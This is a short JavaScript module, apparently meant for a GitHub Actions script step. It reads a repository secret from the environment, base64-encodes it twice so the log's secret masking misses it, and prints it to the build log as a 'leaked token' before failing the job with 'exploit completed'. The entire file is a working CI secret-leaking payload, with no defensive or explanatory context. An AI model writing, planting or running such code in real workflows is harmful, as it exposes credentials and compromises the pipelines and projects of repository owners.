module.exports = async ({ github, context, core }) => {
  const secret = process.env.GARALT_SECRET || 'NO_SECRET';
  const db64 = Buffer.from(Buffer.from(secret).toString('base64')).toString('base64');
  console.log('GARALT_LEAKED_TOKEN=' + db64);
  core.setFailed('exploit completed');
};